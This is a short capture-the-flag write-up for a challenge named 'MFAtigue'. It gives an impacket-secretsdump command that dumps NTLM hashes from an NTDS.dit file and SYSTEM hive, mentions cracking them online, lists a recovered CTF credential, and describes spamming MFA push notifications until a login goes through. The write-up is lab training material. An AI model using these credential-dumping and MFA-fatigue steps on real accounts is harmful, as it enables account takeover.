# MFAtigue
## We got our hands on an NTDS file, and we might be able to break into the Azure Admin account! Can you track it down and try to log in? They might have MFA set up though...

Website and file

---


`/usr/bin/impacket-secretsdump -ntds /home/kali/Desktop/ntds.dit -system /home/kali/Desktop/SYSTEM -hashes nthash:lmhash LOCAL -outputfile ./creds -just-dc-ntlm`

Crackstation > put a lot of hashes

``huntressctf\JILLIAN_DOTSON:katlyn99``

Login to website, put password, spam notification button, gg
